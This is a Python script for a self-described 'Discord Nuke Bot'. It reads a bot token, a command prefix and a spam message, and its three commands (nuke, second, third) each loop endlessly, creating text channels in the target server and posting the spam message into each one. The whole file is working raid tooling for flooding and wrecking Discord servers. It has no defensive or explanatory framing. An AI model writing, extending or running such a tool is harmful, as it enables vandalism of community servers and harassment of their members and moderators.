import discord
from discord.ext import commands
from discord.utils import get
import requests
import threading

token = input("Token: ")
prefix = input("Prefix: ")
spammessage = input("Spam Message: ")


client = commands.Bot(command_prefix=prefix, case_insensitive=True, help_command=None)


@client.event
async def on_ready():
    print("""

 _______      ____     ______       ____  _____ _____  _____ ___  ____  _________     ______     ____   _________ 
|_   __ \   .'    \. .' ___  |     |_   \|_   _|_   _||_   _|_  ||_  _||_   ___  |   |_   _ \  .'    \.|  _   _  |
  | |__) | /  .--.  \ .'   \_|       |   \ | |   | |    | |   | |_/ /    | |_  \_|     | |_) |/  .--.  \_/ | | \_|
  |  __ /  | |    | | |    ____      | |\ \| |   | '    ' |   |  __'.    |  _|  _      |  __/.| |    | |   | |    
 _| |  \ \_\  \--'  / \.___]  _|    _| |_\   |_   \ \--' /   _| |  \ \_ _| |___/ |    _| |__) |  \--'  /  _| |_   
|____| |___|\.____.' \._____.'     |_____|\____|   \.__.'   |____||____|_________|   |_______/ \.____.'  |_____|  

The Discord Nuke Bot is running.


    """)



@client.command()
async def nuke(ctx, arg: str):
    allow_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    author = ctx.author.id
    while 1:
        channels = await guild.create_text_channel(arg)
        await channels.send(content = spammessage)
        print("Created a channel.")


@client.command()
async def second(ctx, arg: str):
    allow_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    author = ctx.author.id
    while 1:
        channels = await guild.create_text_channel(arg)
        await channels.send(content = spammessage)
        print("Runned the command $second")


@client.command()
async def third(ctx, arg: str):
    allow_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    author = ctx.author.id
    while 1:
        channels = await guild.create_text_channel(arg)
        await channels.send(content = spammessage)
        print("Runned the command $third")






client.run(token, bot=True)